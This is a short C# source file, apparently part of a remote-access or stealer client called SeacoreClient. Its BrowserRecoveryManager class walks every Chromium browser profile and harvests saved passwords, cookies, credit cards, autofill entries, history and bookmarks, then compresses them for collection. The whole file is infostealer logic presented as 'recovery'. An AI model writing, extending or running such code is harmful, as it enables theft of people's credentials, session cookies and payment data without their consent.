using SeacoreClient.Features.Recovery.Browsers.Chromium;
using SeacoreClient.Features.Recovery.Utilities;
using System.IO.Compression;

namespace SeacoreClient.Features.Recovery.Browsers
{
    public static class BrowserRecoveryManager
    {
        public static void RecoverPasswordsForAllBrowsers()
        {
            UtilitiesCommon.InitializeRecoveryFolder();
            foreach (var browser in ChromiumCommon.BrowserDirectories)
            {
                ChromiumPasswords.Recover(browser.Key, browser.Value);
                ChromiumBookmarks.Recover(browser.Key, browser.Value);
                ChromiumHistory.Recover(browser.Key, browser.Value);
                ChromiumCreditCards.Recover(browser.Key, browser.Value);
                ChromiumAutofill.Recover(browser.Key, browser.Value);
                ChromiumCookies.Recover(browser.Key, browser.Value);
            }
            UtilitiesCommon.CompressRecoveryFolder();
        }
    }
}